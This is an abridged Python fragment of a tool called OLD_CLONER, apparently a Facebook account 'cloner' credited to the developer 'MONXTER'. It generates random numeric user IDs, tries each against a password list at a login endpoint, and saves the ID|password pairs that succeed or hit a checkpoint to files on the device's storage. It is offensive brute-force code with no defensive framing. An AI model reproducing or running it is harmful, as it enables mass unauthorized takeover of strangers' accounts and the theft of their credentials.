...
class OLD_CLONER:
    ...
    def banner(self):
        os.system("clear")
        print("DEVELOPER  : MONXTER LEGEND BOY")
        print("GITHUB     : athra-302")
    ...
    def oldClone(self,series):
        ...
        for a in range(limit):
            MONXTER = "".join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(MONXTER)
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mMONXTER-XD {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    ...
                    open("/sdcard/MONXTER-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r\x1b[38;5;196mOLD-CP • {ids} • {pas}")
                    open("/sdcard/MONXTER-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
